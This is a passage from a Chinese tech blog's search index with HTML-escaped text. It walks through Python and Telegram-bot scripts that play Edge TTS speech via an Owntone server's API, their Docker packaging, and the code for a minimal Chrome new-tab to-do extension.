\u0026#34;.join(sys.argv[1:-1]) if len(sys.argv) \u0026gt; 2 and sys.argv[-1].lower() in VOICES else \u0026#34; \u0026#34;.join(sys.argv[1:]) voice_key = sys.argv[-1].lower() if sys.argv[-1].lower() in VOICES else \u0026#34;xiaoxiao\u0026#34; voice = VOICES[voice_key] print(f\u0026#34;🎙️ 文字: {text}\u0026#34;) print(f\u0026#34;🔈 声音: {voice} ({voice_key})\u0026#34;) # === 1) 生成 TTS === timestamp = datetime.now().strftime(\u0026#34;%Y%m%d%H%M%S\u0026#34;) tts_filename = f\u0026#34;tts_{timestamp}.mp3\u0026#34; tts_file_path = os.path.join(MEDIA_PATH, tts_filename) print(\u0026#34;⏳ 正在生成 TTS...\u0026#34;) communicate = edge_tts.Communicate(text, voice) await communicate.save(tts_file_path) print(f\u0026#34;✅ 已生成: {tts_file_path}\u0026#34;) # === 2) Owntone 刷库 === print(\u0026#34;🔄 刷新 Owntone 媒体库...\u0026#34;) try: resp = requests.put(f\u0026#34;{OWNTONE_URL}/api/rescan\u0026#34;) if resp.status_code == 204: print(\u0026#34;✅ 已请求刷新\u0026#34;) else: print(f\u0026#34;⚠️ 刷新失败: {resp.status_code} {resp.text}\u0026#34;) sys.exit(1) except Exception as e: print(f\u0026#34;❌ 刷新异常: {e}\u0026#34;) sys.exit(1) # === 3) 等待扫描 === print(\u0026#34;⏳ 等待 5 秒以保证文件被扫描...\u0026#34;) time.sleep(5) # === 4) 搜索文件 === print(\u0026#34;🔍 搜索 TTS 文件...\u0026#34;) try: params = {\u0026#34;query\u0026#34;: tts_filename, \u0026#34;type\u0026#34;: \u0026#34;track\u0026#34;} search_resp = requests.get(f\u0026#34;{OWNTONE_URL}/api/search\u0026#34;, params=params) if search_resp.status_code != 200: print(f\u0026#34;❌ 搜索失败: {search_resp.status_code} {search_resp.text}\u0026#34;) sys.exit(1) search_json = search_resp.json() tracks = search_json.get(\u0026#34;tracks\u0026#34;, {}).get(\u0026#34;items\u0026#34;, []) if not tracks: print(f\u0026#34;❌ 没找到文件，API 返回: {search_json}\u0026#34;) sys.exit(1) track_id = tracks[0][\u0026#34;id\u0026#34;] print(f\u0026#34;✅ 找到 TTS 文件，ID: {track_id}\u0026#34;) except Exception as e: print(f\u0026#34;❌ 搜索异常: {e}\u0026#34;) sys.exit(1) # === 5) 加入播放队列 === print(\u0026#34;➕ 加入播放队列...\u0026#34;) try: add_url = f\u0026#34;{OWNTONE_URL}/api/queue/items/add\u0026#34; add_params = {\u0026#34;uris\u0026#34;: f\u0026#34;library:track:{track_id}\u0026#34;} add_resp = requests.post(add_url, params=add_params) if add_resp.status_code != 200: print(f\u0026#34;⚠️ 加队列失败: {add_resp.status_code} {add_resp.text}\u0026#34;) sys.exit(1) print(\u0026#34;✅ 已加入播放队列\u0026#34;) except Exception as e: print(f\u0026#34;❌ 加队列异常: {e}\u0026#34;) sys.exit(1) # === 6) 播放 === print(\u0026#34;▶️ 正在播放...\u0026#34;) try: play_url = f\u0026#34;{OWNTONE_URL}/api/player/play\u0026#34; play_resp = requests.put(play_url) if play_resp.status_code != 204: print(f\u0026#34;⚠️ 播放失败: {play_resp.status_code} {play_resp.text}\u0026#34;) sys.exit(1) print(\u0026#34;✅ 播放中 🎉\u0026#34;) except Exception as e: print(f\u0026#34;❌ 播放异常: {e}\u0026#34;) sys.exit(1) if __name__ == \u0026#34;__main__\u0026#34;: asyncio.run(main()) 1 安装依赖：\npip install edge-tts requests 修改： ```bash OWNTONE_URL 改成你的 Owntone API MEDIA_PATH 改成你的宿主机挂载的媒体库路径 运行\npython tts_play.py \u0026#34;你好，这是一条测试语音\u0026#34; xiaoyi xiaoxiao xiaoyi yunxi yunjian 可选，默认 xiaoxiao\nTGBOT telegram_edge_tts_bot.py\nimport os import asyncio import time from datetime import datetime import requests import edge_tts from telegram import Update from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes # === 配置 === TELEGRAM_BOT_TOKEN = \u0026#34;YOUR_BOT_TOKEN\u0026#34; # 🔑 这里替换成你的 Bot Token OWNTONE_URL = \u0026#34;http://192.168.80.39:3689\u0026#34; # Owntone API MEDIA_PATH = \u0026#34;/mnt/media\u0026#34; # 宿主机挂载的 Owntone 媒体库路径 # 可选的中文声音 VOICES = { \u0026#34;xiaoxiao\u0026#34;: \u0026#34;zh-CN-XiaoxiaoNeural\u0026#34;, \u0026#34;xiaoyi\u0026#34;: \u0026#34;zh-CN-XiaoyiNeural\u0026#34;, \u0026#34;yunxi\u0026#34;: \u0026#34;zh-CN-YunxiNeural\u0026#34;, \u0026#34;yunjian\u0026#34;: \u0026#34;zh-CN-YunjianNeural\u0026#34; } async def handle_tts(update: Update, context: ContextTypes.DEFAULT_TYPE): args = context.args if not args: await update.message.reply_text( \u0026#34;📝 用法: /tts \u0026lt;要读的文字\u0026gt; [voice]\\n\u0026#34; \u0026#34;例如: /tts 你好 世界 xiaoyi\\n\\n\u0026#34; f\u0026#34;可选 voice: {\u0026#39;, \u0026#39;.join(VOICES.keys())}\u0026#34; ) return text = \u0026#34; \u0026#34;.join(args[:-1]) if len(args) \u0026gt; 1 and args[-1].lower() in VOICES else \u0026#34; \u0026#34;.join(args) voice_key = args[-1].lower() if args[-1].lower() in VOICES else \u0026#34;xiaoxiao\u0026#34; voice = VOICES[voice_key] # 文件名带时间戳 timestamp = datetime.now().strftime(\u0026#34;%Y%m%d%H%M%S\u0026#34;) tts_filename = f\u0026#34;tts_{timestamp}.mp3\u0026#34; tts_file_path = os.path.join(MEDIA_PATH, tts_filename) await update.message.reply_text(f\u0026#34;🎙️ 正在生成 TTS（Voice: {voice_key}）...\u0026#34;) # === 1) 用 edge-tts 生成 === try: communicate = edge_tts.Communicate(text, voice) await communicate.save(tts_file_path) await update.message.reply_text(f\u0026#34;✅ 已生成: {tts_filename}\u0026#34;) except Exception as e: await update.message.reply_text(f\u0026#34;❌ TTS 生成失败: {e}\u0026#34;) return # === 2) Owntone 刷库 === await update.message.reply_text(\u0026#34;🔄 正在刷新 Owntone 媒体库...\u0026#34;) try: resp = requests.put(f\u0026#34;{OWNTONE_URL}/api/rescan\u0026#34;) if resp.status_code == 204: await update.message.reply_text(\u0026#34;✅ 已请求刷新\u0026#34;) else: await update.message.reply_text(f\u0026#34;⚠️ 刷新失败: {resp.status_code} {resp.text}\u0026#34;) return except Exception as e: await update.message.reply_text(f\u0026#34;❌ 刷新异常: {e}\u0026#34;) return # === 3) 等待 === await update.message.reply_text(\u0026#34;⏳ 等待 5 秒以保证文件被扫描...\u0026#34;) time.sleep(5) # === 4) 搜索文件 === try: params = {\u0026#34;query\u0026#34;: tts_filename, \u0026#34;type\u0026#34;: \u0026#34;track\u0026#34;} search_resp = requests.get(f\u0026#34;{OWNTONE_URL}/api/search\u0026#34;, params=params) if search_resp.status_code != 200: await update.message.reply_text(f\u0026#34;❌ 搜索失败: {search_resp.status_code} {search_resp.text}\u0026#34;) return search_json = search_resp.json() tracks = search_json.get(\u0026#34;tracks\u0026#34;, {}).get(\u0026#34;items\u0026#34;, []) if not tracks: await update.message.reply_text(f\u0026#34;❌ 没找到文件，API 返回: {search_json}\u0026#34;) return track_id = tracks[0][\u0026#34;id\u0026#34;] except Exception as e: await update.message.reply_text(f\u0026#34;❌ 搜索异常: {e}\u0026#34;) return # === 5) 加入播放队列 === try: add_url = f\u0026#34;{OWNTONE_URL}/api/queue/items/add\u0026#34; add_params = {\u0026#34;uris\u0026#34;: f\u0026#34;library:track:{track_id}\u0026#34;} add_resp = requests.post(add_url, params=add_params) if add_resp.status_code != 200: await update.message.reply_text(f\u0026#34;⚠️ 加队列失败: {add_resp.status_code} {add_resp.text}\u0026#34;) return await update.message.reply_text(\u0026#34;✅ 已加入播放队列\u0026#34;) except Exception as e: await update.message.reply_text(f\u0026#34;❌ 加队列异常: {e}\u0026#34;) return # === 6) 播放 === try: play_url = f\u0026#34;{OWNTONE_URL}/api/player/play\u0026#34; play_resp = requests.put(play_url) if play_resp.status_code != 204: await update.message.reply_text(f\u0026#34;⚠️ 播放失败: {play_resp.status_code} {play_resp.text}\u0026#34;) return await update.message.reply_text(\u0026#34;▶️ 正在播放！🎉\u0026#34;) except Exception as e: await update.message.reply_text(f\u0026#34;❌ 播放异常: {e}\u0026#34;) def main(): app = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build() app.add_handler(CommandHandler(\u0026#34;tts\u0026#34;, handle_tts)) print(\u0026#34;🤖 机器人已启动，发送 /tts \u0026lt;文字\u0026gt; [voice] 即可！\u0026#34;) app.run_polling() if __name__ == \u0026#34;__main__\u0026#34;: asyncio.run(main()) 安装依赖\npip install python-telegram-bot==20.* edge-tts requests 替换你的 YOUR_BOT_TOKEN 去 @BotFather 创建 Telegram Bot 拿到 Token。\n运行 python telegram_edge_tts_bot.py 在 Telegram 中使用\n/tts 你好 Owntone xiaoyi xiaoyi 可换成 xiaoxiao / yunxi / yunjian\n不写 voice 时，默认 xiaoxiao\ndocker Edge-TTS + Owntone + TgBot 用 TELEGRAM_BOT_TOKEN 做环境变量， 容器内挂载 /mnt/media， 自动执行生成 → 刷库 → 搜索 → 加队列 → 播放， 可以通过 /tts 文字 声音 指令选声线（可选）。\n目录结构示例 ./ttsbot 文件夹里：\nttsbot/ ├── app.py ├── requirements.txt ├── Dockerfile requirements.txt python-telegram-bot==20.7 edge-tts requests app.py import os import asyncio import time from datetime import datetime import requests import edge_tts from telegram import Update from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes # === 配置 === OWNTONE_URL = \u0026#34;http://192.168.80.39:3689\u0026#34; MEDIA_PATH = \u0026#34;/mnt/media\u0026#34; VOICES = { \u0026#34;xiaoxiao\u0026#34;: \u0026#34;zh-CN-XiaoxiaoNeural\u0026#34;, \u0026#34;xiaoyi\u0026#34;: \u0026#34;zh-CN-XiaoyiNeural\u0026#34;, \u0026#34;yunxi\u0026#34;: \u0026#34;zh-CN-YunxiNeural\u0026#34;, \u0026#34;yunjian\u0026#34;: \u0026#34;zh-CN-YunjianNeural\u0026#34; } async def generate_tts(text, voice_key): voice = VOICES.get(voice_key, VOICES[\u0026#34;xiaoxiao\u0026#34;]) timestamp = datetime.now().strftime(\u0026#34;%Y%m%d%H%M%S\u0026#34;) tts_filename = f\u0026#34;tts_{timestamp}.mp3\u0026#34; tts_file_path = os.path.join(MEDIA_PATH, tts_filename) communicate = edge_tts.Communicate(text, voice) await communicate.save(tts_file_path) return tts_filename def owntone_rescan(): resp = requests.put(f\u0026#34;{OWNTONE_URL}/api/rescan\u0026#34;) if resp.status_code == 204: return True else: return False def owntone_search(filename): params = {\u0026#34;query\u0026#34;: filename, \u0026#34;type\u0026#34;: \u0026#34;track\u0026#34;} resp = requests.get(f\u0026#34;{OWNTONE_URL}/api/search\u0026#34;, params=params) if resp.status_code != 200: return None tracks = resp.json().get(\u0026#34;tracks\u0026#34;, {}).get(\u0026#34;items\u0026#34;, []) if not tracks: return None return tracks[0][\u0026#34;id\u0026#34;] def owntone_add_queue(track_id): url = f\u0026#34;{OWNTONE_URL}/api/queue/items/add\u0026#34; params = {\u0026#34;uris\u0026#34;: f\u0026#34;library:track:{track_id}\u0026#34;} resp = requests.post(url, params=params) return resp.status_code == 200 def owntone_play(): resp = requests.put(f\u0026#34;{OWNTONE_URL}/api/player/play\u0026#34;) return resp.status_code == 204 async def tts_command(update: Update, context: ContextTypes.DEFAULT_TYPE): args = context.args if not args: await update.message.reply_text(\u0026#34;用法: /tts \u0026lt;内容\u0026gt; [声音: xiaoxiao|xiaoyi|yunxi|yunjian]\u0026#34;) return text = \u0026#34; \u0026#34;.join(args[:-1]) if args[-1] in VOICES else \u0026#34; \u0026#34;.join(args) voice_key = args[-1] if args[-1] in VOICES else \u0026#34;xiaoxiao\u0026#34; await update.message.reply_text(f\u0026#34;生成中... 声音: {voice_key}\u0026#34;) tts_filename = await generate_tts(text, voice_key) await update.message.reply_text(f\u0026#34;TTS 文件已生成: {tts_filename}\u0026#34;) if not owntone_rescan(): await update.message.reply_text(\u0026#34;Owntone 刷库失败！\u0026#34;) return await update.message.reply_text(\u0026#34;等待 Owntone 刷库...\u0026#34;) time.sleep(5) track_id = owntone_search(tts_filename) if not track_id: await update.message.reply_text(\u0026#34;没找到生成的音频文件！\u0026#34;) return if not owntone_add_queue(track_id): await update.message.reply_text(\u0026#34;加入播放队列失败！\u0026#34;) return if not owntone_play(): await update.message.reply_text(\u0026#34;播放失败！\u0026#34;) return await update.message.reply_text(\u0026#34;🎉 已开始播放！\u0026#34;) async def main(): token = os.getenv(\u0026#34;TELEGRAM_BOT_TOKEN\u0026#34;) if not token: print(\u0026#34;❌ TELEGRAM_BOT_TOKEN 未设置\u0026#34;) return app = ApplicationBuilder().token(token).build() app.add_handler(CommandHandler(\u0026#34;tts\u0026#34;, tts_command)) print(\u0026#34;✅ 机器人已启动\u0026#34;) await app.run_polling() if __name__ == \u0026#34;__main__\u0026#34;: asyncio.run(main()) Dockerfile FROM python:3.11-slim WORKDIR /app COPY requirements.txt . RUN pip install -r requirements.txt COPY app.py . ENV PYTHONUNBUFFERED=1 CMD [\u0026#34;python\u0026#34;, \u0026#34;app.py\u0026#34;] 构建镜像 docker build -t ttsbot . 运行示例 docker run -d \\ -v /mnt/media:/mnt/media \\ -e TELEGRAM_BOT_TOKEN=你的BotToken \\ --name my_ttsbot \\ ttsbot Tg中 给机器人发：\n/tts 你好 这是测试 yunxi 就会生成 TTS → Owntone 刷库 → 自动播放！\n打包 docker-compose.yml 项目结构示例 ttsbot/ ├── app.py ├── requirements.txt ├── Dockerfile ├── docker-compose.yml docker-compose.yml version: \u0026#34;3.8\u0026#34; services: ttsbot: build: . container_name: ttsbot restart: unless-stopped environment: TELEGRAM_BOT_TOKEN: \u0026#34;在这里填写你的 Telegram Bot Token\u0026#34; volumes: - /mnt/media:/mnt/media 使用方法 1️ 把 app.py、Dockerfile、requirements.txt 放一起 2️ 在同目录下新建 docker-compose.yml（如上） 3️ 修改 TELEGRAM_BOT_TOKEN 为你的 Bot Token 4️ 在该目录执行：\ndocker-compose up --build -d 这样就自动构建镜像 用 /mnt/media 做宿主机挂载 Bot 会持续运行，支持 /tts 命令 出错自动重启\n快速停止 / 启动 / 查看 # 停止 docker-compose down # 启动 docker-compose up -d # 查看日志 docker-compose logs -f api\ncurl -X GET \u0026#34;http://localhost:3689/api/library/playlists/1/tracks\u0026#34; //list curl -X GET \u0026#34;http://localhost:3689/api/library/playlists\u0026#34; 参考文档： https://hub.docker.com/r/owntone/owntone/tags https://owntone.github.io/owntone-server/json-api/ https://github.com/sclsj/owntone-server/blob/master/owntone.conf.in https://github.com/owntone/owntone-server/blob/28.1/README_JSON_API.md#get-player-status\n","permalink":"https://qfsyso.github.io/posts/owntone-tts-to-airplay/","summary":"Owntone Owntone（以前叫 forked-daapd）是一个自建音乐服务器，支持：\n音乐库管理（本地音乐）， AirPlay / Chromecast / Roon / MPD 等协议， 播放列表 / 电台 / 播放控制， 通过 REST API 控制。\nTTS（文本转语音） 用外部TTS 如 Google TTS ， Edge TTS， OpenAI TTS生成.wav .mp3， 放入媒体库文件夹 ，通过API刷新 添加 播放。\nOwntone创建 # 确保有写权限： sudo chown -R 1000:1000 /var/cache/owntone sudo chmod -R 755 /var/cache/owntone docker run -d \\ --name=OwnTone1 \\ --network=host \\ -e UID=1000 \\ -e GID=1000 \\ -v /etc/owntone:/etc/owntone \\ -v /mnt/media:/srv/media \\ -v /var/cache/owntone:/var/cache/owntone \\ --restart unless-stopped \\ owntone/owntone:latest # 停止删除 docker stop OwnTone1 \u0026amp;\u0026amp; docker rm OwnTone1 # 精简版 docker run -d \\ --name=OwnTone1 \\ --network=host \\ -v /root/owntone/config:/etc/owntone \\ -v /root/owntone/media:/srv/media/ \\ -v /root/owntone/cache:/var/cache/owntone \\ --restart unless-stopped \\ docker.","title":"Owntone TTS To AirPlay"},{"content":"Chrome Extensions目录结构。 📁 L-ToDo/\n├─ 📄 manifest.json\n├─ 📄 popup.html\n├─ 📄 popup.js\n├─ 📄 background.js\n├─ 📄 content.css\n├─ 📄 icons/\n│ ├─ 16.png\n│ ├─ 48.png\n│ └─ 128.png\n└─ 📁 _metadata (Chrome生成)\n一、manifest.json { \u0026#34;manifest_version\u0026#34;: 3, \u0026#34;name\u0026#34;: \u0026#34; L-ToDo\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;Minimal new-tab with quick links \u0026amp; to-do list\u0026#34;, \u0026#34;version\u0026#34;: \u0026#34;1.0\u0026#34;, \u0026#34;icons\u0026#34;: { \u0026#34;16\u0026#34;: \u0026#34;icons/16.png\u0026#34;, \u0026#34;48\u0026#34;: \u0026#34;icons/48.png\u0026#34;, \u0026#34;128\u0026#34;: \u0026#34;icons/128.png\u0026#34; }, \u0026#34;chrome_url_overrides\u0026#34;: { \u0026#34;newtab\u0026#34;: \u0026#34;popup.html\u0026#34; }, \u0026#34;permissions\u0026#34;: [\u0026#34;storage\u0026#34;], \u0026#34;background\u0026#34;: { \u0026#34;service_worker\u0026#34;: \u0026#34;background.js\u0026#34; }, \u0026#34;content_security_policy\u0026#34;: { \u0026#34;extension_pages\u0026#34;: \u0026#34;script-src \u0026#39;self\u0026#39;; object-src \u0026#39;self\u0026#39;\u0026#34; } } 二、popup.html（既是 popup 也是 new-tab 页面） \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;/\u0026gt; \u0026lt;title\u0026gt; L-ToDo\u0026lt;/title\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;content.css\u0026#34;/\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1 id=\u0026#34;greeting\u0026#34;\u0026gt;Hello\u0026lt;/h1\u0026gt; \u0026lt;section id=\u0026#34;links\u0026#34;\u0026gt; \u0026lt;h2\u0026gt;Quick Links\u0026lt;/h2\u0026gt; \u0026lt;ul id=\u0026#34;linkList\u0026#34;\u0026gt;\u0026lt;/ul\u0026gt; \u0026lt;form id=\u0026#34;linkForm\u0026#34;\u0026gt; \u0026lt;input id=\u0026#34;linkName\u0026#34; placeholder=\u0026#34;Name\u0026#34; required/\u0026gt; \u0026lt;input id=\u0026#34;linkUrl\u0026#34; placeholder=\u0026#34;https://…\u0026#34; type=\u0026#34;url\u0026#34; required/\u0026gt; \u0026lt;button\u0026gt;Add\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/section\u0026gt; \u0026lt;section id=\u0026#34;todos\u0026#34;\u0026gt; \u0026lt;h2\u0026gt;To-Do\u0026lt;/h2\u0026gt; \u0026lt;ul id=\u0026#34;todoList\u0026#34;\u0026gt;\u0026lt;/ul\u0026gt; \u0026lt;form id=\u0026#34;todoForm\u0026#34;\u0026gt; \u0026lt;input id=\u0026#34;todoInput\u0026#34; placeholder=\u0026#34;New task…\u0026#34; required/\u0026gt; \u0026lt;button\u0026gt;Add\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/section\u0026gt; \u0026lt;section id=\u0026#34;controls\u0026#34;\u0026gt; \u0026lt;button id=\u0026#34;exportBtn\u0026#34;\u0026gt;Export\u0026lt;/button\u0026gt; \u0026lt;button id=\u0026#34;importBtn\u0026#34;\u0026gt;Import\u0026lt;/button\u0026gt; \u0026lt;input type=\u0026#34;file\u0026#34; id=\u0026#34;importFile\u0026#34; accept=\u0026#34;.json\u0026#34; style=\u0026#34;display:none\u0026#34;/\u0026gt; \u0026lt;/section\u0026gt; \u0026lt;script src=\u0026#34;popup.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 三、content.css（极简样式，可随意改） :root { --bg: #f5f5f7; --text: #1d1d1f; --accent: #007aff; } body { margin: 0; padding: 2rem; font-family: -apple-system, BlinkMacSystemFont, \u0026#34;Segoe UI\u0026#34;, Roboto, sans-serif; background: var(--bg); color: var(--text); } h1 { margin-top: 0; } section { margin-bottom: 2rem; } ul { list-style: none; padding: 0; } li { display: flex; justify-content: space-between; padding: .25rem 0; } a { color: var(--accent); text-decoration: none; } button { background: var(--accent); color: #fff; border: 0; padding: .3rem .6rem; border-radius: 4px; cursor: pointer; } input[type=text], input[type=url] { padding: .3rem; margin-right: .3rem; border: 1px solid #ccc; border-radius: 4px; } 四、popup.js（所有交互逻辑） /* global chrome */ const $ = (sel, ctx = document) =\u0026gt; ctx.querySelector(sel); /* ---------- 存储工具 ---------- */ const STORAGE_KEY = \u0026#39; L-ToDo\u0026#39;; async function save(data) { return chrome.storage.local.set({ [STORAGE_KEY]: data }); } async function load() { const res = await chrome.storage.local.get(STORAGE_KEY); return res[STORAGE_KEY] || { links: [], todos: [] }; } /* ---------- 初始化 ---------- */ (async () =\u0026gt; { const data = await load(); renderLinks(data.links); renderTodos(data.todos); greet(); })(); /* ---------- 问候 ---------- */ function greet() { const name = localStorage.getItem(\u0026#39;username\u0026#39;) || \u0026#39;friend\u0026#39;; $(\u0026#39;#greeting\u0026#39;).textContent = `Hello, ${name}!`; } /* ---------- Quick Links ---------- */ $(\u0026#39;#linkForm\u0026#39;).addEventListener(\u0026#39;submit\u0026#39;, async e =\u0026gt; { e.preventDefault(); const name = $(\u0026#39;#linkName\u0026#39;).value.trim(); const url = $(\u0026#39;#linkUrl\u0026#39;).value.trim(); const data = await load(); data.links.push({ name, url }); await save(data); renderLinks(data.links); e.target.reset(); }); function renderLinks(list) { const ul = $(\u0026#39;#linkList\u0026#39;); ul.innerHTML = \u0026#39;\u0026#39;; list.forEach(({ name, url }, idx) =\u0026gt; { const li = document.createElement(\u0026#39;li\u0026#39;); li.innerHTML = ` \u0026lt;a href=\u0026#34;${url}\u0026#34; target=\u0026#34;_blank\u0026#34; rel=\u0026#34;noopener\u0026#34;\u0026gt;${name}\u0026lt;/a\u0026gt; \u0026lt;button data-link-idx=\u0026#34;${idx}\u0026#34;\u0026gt;✕\u0026lt;/button\u0026gt;`; ul.appendChild(li); }); ul.addEventListener(\u0026#39;click\u0026#39;, async e =\u0026gt; { if (!e.target.matches(\u0026#39;[data-link-idx]\u0026#39;)) return; const idx = +e.target.dataset.linkIdx; const data = await load(); data.links.splice(idx, 1); await save(data); renderLinks(data.links); }); } /* ---------- To-Do List ---------- */ $(\u0026#39;#todoForm\u0026#39;).addEventListener(\u0026#39;submit\u0026#39;, async e =\u0026gt; { e.preventDefault(); const text = $(\u0026#39;#todoInput\u0026#39;).value.trim(); const data = await load(); data.todos.push({ text, done: false }); await save(data); renderTodos(data.todos); e.target.reset(); }); function renderTodos(list) { const ul = $(\u0026#39;#todoList\u0026#39;); ul.innerHTML = \u0026#39;\u0026#39;; list.forEach(({ text, done }, idx) =\u0026gt; { const li = document.createElement(\u0026#39;li\u0026#39;); li.innerHTML = ` \u0026lt;label\u0026gt; \u0026lt;input type=\u0026#34;checkbox\u0026#34; data-todo-idx=\u0026#34;${idx}\u0026#34; ${done ? \u0026#39;checked\u0026#39; : \u0026#39;\u0026#39;}\u0026gt; \u0026lt;span style=\u0026#34;${done ? \u0026#39;text-decoration:line-through\u0026#39; : \u0026#39;\u0026#39;}\u0026#34;\u0026gt;${text}\u0026lt;/span\u0026gt; \u0026lt;/label\u0026gt; \u0026lt;button data-todo-del=\u0026#34;${idx}\u0026#34;\u0026gt;✕\u0026lt;/button\u0026gt;`; ul.appendChild(li); }); ul.addEventListener(\u0026#39;click\u0026#39;, async e =\u0026gt; { const data = await load(); if (e.target.matches(\u0026#39;[data-todo-idx]\u0026#39;)) { const idx = +e.target.dataset.todoIdx; data.todos[idx].done = e.target.checked; await save(data); renderTodos(data.todos); } if (e.target.matches(\u0026#39;[data-todo-del]\u0026#39;)) { const idx = +e.target.dataset.todoDel; data.todos.splice(idx, 1); await save(data); renderTodos(data.todos); } }); } /* ---------- 导出 / 导入 ---------- */ $(\u0026#39;#exportBtn\u0026#39;).addEventListener(\u0026#39;click\u0026#39;, async () =\u0026gt; { const blob = new Blob([JSON.stringify(await load(), null, 2)], { type: \u0026#39;application/json\u0026#39; }); const url = URL.createObjectURL(blob); const a = document.createElement(\u0026#39;a\u0026#39;); a.href = url; a.download = \u0026#39; L-ToDo-backup.json\u0026#39;; a.click(); URL.revokeObjectURL(url); }); $(\u0026#39;#importBtn\u0026#39;).addEventListener(\u0026#39;click\u0026#39;, () =\u0026gt; $(\u0026#39;#importFile\u0026#39;).click()); $(\u0026#39;#importFile\u0026#39;).addEventListener(\u0026#39;change\u0026#39;, async e =\u0026gt; { const file = e.target.files[0]; if (!file) return; try { const data = JSON.parse(await file.text()); await save(data); location.reload(); } catch (err) { alert(\u0026#39;Invalid backup file\u0026#39;); } }); 五、background.js（目前仅保留空壳，方便后续扩展） /* global chrome */ chrome.runtime.onInstalled.addListener(() =\u0026gt; { console.log(\u0026#39; L-ToDo installed\u0026#39;); }); 六、图标 把 16×16、48×48、128×128 的 png 图标放进 icons/ 目录即可。 ──────────────────\n安装步骤 将以上文件按目录放好。 打开 Chrome → 右上角「┇」→ 更多工具 → 扩展程序 → 右上角开启「开发者模式」。 点击「加载已解压的扩展程序」，选择 L-ToDo 文件夹。 新建标签页即可看到效果。 至此，一个支持「自定义快速链接 + To-Do 列表 + 配置导出/导入」的极简 new-tab 插件就完成了。\n居中 Links 并排 实时时间 popup.html（居中布局 \u0026amp; 时间） \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;/\u0026gt; \u0026lt;title\u0026gt; L-ToDo\u0026lt;/title\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;content.css\u0026#34;/\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;wrapper\u0026#34;\u0026gt; \u0026lt;h1 id=\u0026#34;greeting\u0026#34;\u0026gt; Hello, L !\u0026lt;/h1\u0026gt; \u0026lt;p id=\u0026#34;clock\u0026#34;\u0026gt;--:--:--\u0026lt;/p\u0026gt; \u0026lt;section id=\u0026#34;links\u0026#34;\u0026gt; \u0026lt;h2\u0026gt;Quick Links\u0026lt;/h2\u0026gt; \u0026lt;div id=\u0026#34;linkList\u0026#34; class=\u0026#34;link-row\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;form id=\u0026#34;linkForm\u0026#34; class=\u0026#34;inline-form\u0026#34;\u0026gt; \u0026lt;input id=\u0026#34;linkName\u0026#34; placeholder=\u0026#34;Name\u0026#34; required/\u0026gt; \u0026lt;input id=\u0026#34;linkUrl\u0026#34; placeholder=\u0026#34;https://…\u0026#34; type=\u0026#34;url\u0026#34; required/\u0026gt; \u0026lt;button\u0026gt;Add\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/section\u0026gt; \u0026lt;section id=\u0026#34;todos\u0026#34;\u0026gt; \u0026lt;h2\u0026gt;To-Do\u0026lt;/h2\u0026gt; \u0026lt;ul id=\u0026#34;todoList\u0026#34;\u0026gt;\u0026lt;/ul\u0026gt; \u0026lt;form id=\u0026#34;todoForm\u0026#34;\u0026gt; \u0026lt;input id=\u0026#34;todoInput\u0026#34; placeholder=\u0026#34;New task…\u0026#34; required/\u0026gt; \u0026lt;button\u0026gt;Add\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/section\u0026gt; \u0026lt;section id=\u0026#34;controls\u0026#34;\u0026gt; \u0026lt;button id=\u0026#34;exportBtn\u0026#34;\u0026gt;Export\u0026lt;/button\u0026gt; \u0026lt;button id=\u0026#34;importBtn\u0026#34;\u0026gt;Import\u0026lt;/button\u0026gt; \u0026lt;input type=\u0026#34;file\u0026#34; id=\u0026#34;importFile\u0026#34; accept=\u0026#34;.json\u0026#34; style=\u0026#34;display:none\u0026#34;/\u0026gt; \u0026lt;/section\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script src=\u0026#34;popup.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; content.css（居中 + 并排） :root { --bg: #f5f5f7; --text: #1d1d1f; --accent: #007aff; --radius: 12px; } * { box-sizing: border-box; } html, body { height: 100%; margin: 0; } body { font-family: -apple-system, BlinkMacSystemFont, \u0026#34;Segoe UI\u0026#34;, Roboto, sans-serif; background: var(--bg); color: var(--text); display: flex; align-items: center; justify-content: center; } .wrapper { max-width: 600px; width: 100%; padding: 2rem; text-align: center; } h1 { margin: 0 0 .25rem; font-size: 2.5rem; } #clock { font-size: 1.2rem; margin: 0 0 2rem; color: var(--accent); } section { margin-bottom: 2rem; } h2 { margin-bottom: .75rem; font-size: 1.25rem; } /* Quick Links 并排 */ .link-row { display: flex; flex-wrap: wrap; justify-content: center; gap: .75rem; margin-bottom: 1rem; } .link-row a { background: #fff; border: 1px solid #e1e1e6; padding: .5rem 1rem; border-radius: var(--radius); text-decoration: none; color: var(--accent); transition: transform .15s; } .link-row a:hover { transform: translateY(-2px); } .link-row button { margin-left: .5rem; background: transparent; border: 0; color: #ff3b30; cursor: pointer; } /* 表单横向排列 */ .inline-form { display: flex; justify-content: center; gap: .5rem; } input[type=text], input[type=url] { padding: .5rem; border: 1px solid #ccc; border-radius: var(--radius); } button { background: var(--accent); color: #fff; border: 0; padding: .5rem 1rem; border-radius: var(--radius); cursor: pointer; } ul { list-style: none; padding: 0; text-align: left; max-width: 320px; margin: 0 auto 1rem; } li { display: flex; justify-content: space-between; align-items: center; padding: 